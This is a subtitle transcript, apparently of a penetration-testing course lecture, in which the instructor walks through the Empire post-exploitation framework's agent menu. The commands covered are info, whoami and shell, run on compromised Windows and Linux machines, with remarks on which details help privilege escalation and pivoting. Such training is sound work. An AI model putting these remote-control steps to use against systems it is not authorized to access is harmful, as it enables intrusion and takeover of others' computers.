00:01:08,300 --> 00:01:10,880
computers that I got access to.

15
00:01:11,270 --> 00:01:18,080
The first one is my Windows computer, my message computer, and the second one is a Linux machine.

16
00:01:18,080 --> 00:01:19,730
And this is simply the username.

17
00:01:19,730 --> 00:01:21,560
It's called Evil Crowd Cable.

18
00:01:21,710 --> 00:01:27,650
Now, as we know, to interact with any of these, we can simply type interact followed by the name

19
00:01:27,650 --> 00:01:28,550
of the machine.

20
00:01:28,550 --> 00:01:31,370
And you can see the two names are listed here for me.

21
00:01:31,370 --> 00:01:37,580
So if I go for the first one, I'm going to be interacting with the Windows machine right now and I

22
00:01:37,580 --> 00:01:41,920
can simply do info to see all of the information of this computer.

23
00:01:41,930 --> 00:01:47,930
This is something that we run previously and we seen how it can give us extensive information about

24
00:01:47,930 --> 00:01:50,780
the computer that we have access to at the moment.

25
00:01:50,930 --> 00:01:53,360
I will get back to this menu in a second.

26
00:01:53,360 --> 00:01:58,790
But just to show you so right now I'm inside the windows machine and I can run commands within the Windows

27
00:01:58,790 --> 00:02:04,910
machine, but if I wanted to go back to all of the agents and interact with the Linux machine, I can

28
00:02:04,910 --> 00:02:08,210
simply type back to go back one step.

29
00:02:08,210 --> 00:02:14,330
And now I'm inside the agents menu so I can simply type list to list all of the possible agents.

30
00:02:14,330 --> 00:02:18,560
And again, I'm going to get a list of all of the computers that I have access to.

31
00:02:18,560 --> 00:02:24,650
And if I wanted to interact with the Linux computer, all I have to do is simply type interact, followed

32
00:02:24,650 --> 00:02:28,490
by the name of the Linux computer I'm going to hit Enter.

33
00:02:28,490 --> 00:02:35,870
And now if I do info, you will notice that I'm inside the evil crowd cable the Ubuntu computer and

34
00:02:35,870 --> 00:02:38,870
you can see in here the operating system is Linux.

35
00:02:39,380 --> 00:02:46,970
So again, I'm simply going to go back, list the agents and interact with the first one because I actually

36
00:02:46,970 --> 00:02:49,430
want to show you a few things within the Windows machine.

37
00:02:49,430 --> 00:02:54,230
And again I'm going to run the info command, but this time we're actually going to pay more attention

38
00:02:54,230 --> 00:02:56,660
to the data that this command returns.

39
00:02:56,930 --> 00:03:01,280
So you can see it first of all, gives us the architecture, which is very important when it comes to

40
00:03:01,280 --> 00:03:06,520
post exploitation, because you need to run programs that can run on this architecture.

41
00:03:06,530 --> 00:03:09,950
You can see the IP, which is obviously very, very useful.

42
00:03:09,950 --> 00:03:12,950
You can see the hostname very useful as well.

43
00:03:12,950 --> 00:03:17,390
We can see the listener that gave us access to, but that's fine, that's visible anyway.

44
00:03:17,600 --> 00:03:21,050
You can see the OS details, which is very, very important.

45
00:03:21,050 --> 00:03:26,120
In the Linux example, you remember we seen the Linux version and the kernel running, which is very

46
00:03:26,120 --> 00:03:32,690
useful in order to search for post-exploitation modules and vulnerabilities and privilege escalation

47
00:03:32,690 --> 00:03:33,460
exploits.

48
00:03:33,470 --> 00:03:34,670
Same goes for Windows.

49
00:03:34,670 --> 00:03:38,090
We can see that it's Windows 10 enterprise evaluation.

50
00:03:38,090 --> 00:03:44,680
Again, that would be very useful in order to escalate your privileges on run post exploitation modules.

51
00:03:44,690 --> 00:03:46,940
We also have the high integrity in here.

52
00:03:46,940 --> 00:03:49,190
I'm sorry, I forgot to talk about this.

53
00:03:49,190 --> 00:03:55,760
That basically indicates whether you have system or administrator privileges or not on the system.

54
00:03:55,760 --> 00:03:59,390
Right now it's zero, meaning that we are running as a normal user.

55
00:03:59,390 --> 00:04:05,810
We do not have admin privileges and finally, if we scroll down, we also have the username which we've

56
00:04:05,810 --> 00:04:06,740
already seen before.

57
00:04:06,740 --> 00:04:08,600
It's MSG i.e. user.

58
00:04:09,020 --> 00:04:11,660
So that's the info command, something we've seen before.

59
00:04:11,660 --> 00:04:17,060
We just never really explained it that much, but to get a list of all of the commands that you can

60
00:04:17,060 --> 00:04:22,430
run once you have access to a computer, as usual, you can simply type help and you're going to get

61
00:04:22,430 --> 00:04:28,130
a list of all of the commands that you can run within the empire access that we got so far.

62
00:04:28,890 --> 00:04:33,720
Most of them are very simple and self explanatory, and we're actually going to use a lot of them as

63
00:04:33,720 --> 00:04:35,350
we go throughout this section.

64
00:04:35,370 --> 00:04:41,310
You can see the Who Am I in here is actually very, very useful, which tells you the current username

65
00:04:41,310 --> 00:04:43,470
and privileges that you have on the system.

66
00:04:43,470 --> 00:04:46,320
So we can do very quickly, who am I?

67
00:04:46,350 --> 00:04:51,330
And it's telling us that we are the user on the current system, but we already know that.

68
00:04:52,780 --> 00:04:57,880
Another really useful command that I want to show you in this lecture where we are covering the basics

69
00:04:57,880 --> 00:04:59,230
is the shell command.

70
00:04:59,230 --> 00:05:05,650
And basically it can be used to run a shell command on the target system so we can simply type shell

71
00:05:05,650 --> 00:05:11,530
followed by any command, and it's going to execute it on the target system and return the result to

72
00:05:11,530 --> 00:05:12,150
us.

73
00:05:12,160 --> 00:05:14,860
For example, we can do sysinfo.

74
00:05:16,150 --> 00:05:19,720
And this will get us information about the system that we just hacked.

75
00:05:19,960 --> 00:05:27,610
We can also do Shell, followed by Ipconfig to get information about the network interfaces and the

76
00:05:27,610 --> 00:05:29,710
networks that they are connected to.

77
00:05:29,740 --> 00:05:34,570
So again, you can see our network interface, you can see the IP that it's connected to.

78
00:05:34,600 --> 00:05:36,020
You can see the Hostname.

79
00:05:36,040 --> 00:05:38,790
Very, very important when it comes to pivoting.

80
00:05:38,800 --> 00:05:44,110
And you can basically type shell followed by any command, whether you have access to a Windows Linux

81
00:05:44,110 --> 00:05:45,670
or OSX computer.

82
00:05:45,670 --> 00:05:51,700
If you run a command that the target system can understand and execute, then the empire shell will

83
00:05:51,700 --> 00:05:55,150
actually go ahead, execute that command and show you the result.

84
00:05:55,300 --> 00:06:00,550
So even though this is one command, it can actually be used to run so much and pretty much remotely,

85
00:06:00,550 --> 00:06:03,970
fully control the computers that you gain access to.

86
